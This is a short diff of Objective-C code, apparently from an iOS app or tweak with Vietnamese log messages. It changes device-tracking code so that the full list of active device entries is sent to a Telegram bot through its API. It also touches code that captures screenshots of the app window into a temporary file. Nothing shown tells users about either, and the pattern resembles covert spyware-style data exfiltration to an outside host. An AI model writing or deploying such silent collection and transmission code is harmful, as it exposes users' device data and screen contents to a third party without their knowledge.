@@ -76,9 +76,14 @@
     
     activeDevices[deviceUUID] = deviceInfo;
     
-  
-    [self sendMessageToTelegram:deviceInfo];
+    NSMutableString *message = [NSMutableString stringWithFormat:@"Số người dùng đang hoạt động: %lu\nDanh sách người dùng:\n", (unsigned long)activeDevices.count];
+    [activeDevices enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
+        [message appendFormat:@"\n> %@", obj];
+    }];
+    
+    [self sendMessageToTelegram:message];
 }
+
 - (void)sendMessageToTelegram:(NSString *)message {
     dispatch_async(serialQueue, ^{
         NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", TELEGRAM_API_TOKEN];
@@ -117,7 +122,7 @@
         NSString *logPath = [[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"];
         [self logMessage:@"Bắt đầu chụp ảnh..." toLogFile:logPath];
         
-        // Chụp màn hình
+
         UIWindow *window = [UIApplication sharedApplication].keyWindow;
         if (!window) {
             [self logMessage:@"Lỗi: Không thể tìm thấy cửa sổ chính." toLogFile:logPath];
@@ -134,7 +139,6 @@
             return;
         }
 
-        // Lưu ảnh tạm
         NSString *tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"screenshot.png"];
         if (![UIImagePNGRepresentation(screenshot) writeToFile:tempPath atomically:YES]) {
             [self logMessage:[NSString stringWithFormat:@"Lỗi: Không thể lưu ảnh chụp màn hình tại %@", tempPath] toLogFile:logPath];
